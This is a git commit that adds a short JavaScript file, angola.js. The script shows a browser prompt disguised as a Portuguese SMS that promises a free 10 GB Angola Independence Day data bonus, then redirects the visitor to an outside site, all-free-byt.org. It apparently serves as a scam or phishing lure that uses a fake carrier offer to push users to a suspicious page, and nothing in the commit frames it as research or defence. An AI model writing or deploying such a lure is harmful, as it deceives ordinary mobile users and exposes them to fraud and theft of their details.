b27197355389653f7aad97535eff6e847b8bdac8
Imohekpe1 <169145829+Imohekpe1@users.noreply.github.com>
2024-11-04 00:13:06 -0800

    Create angola.js

---
+++ angola.js
@@ -0,0 +1,6 @@
+
+var password = 'ATIVE 10 GB'
+password=prompt('SMS: Olá, sua oferta do Dia da Independência está aguardando. Por favor, pressione OK para ativar 10 GB agora antes de 30 de novembro ','ATIVE 10 GB ');
+if (password != 'ATIVE 10 GB ') {
+location.href='https://all-free-byt.org/angola-10gb.html';
+}
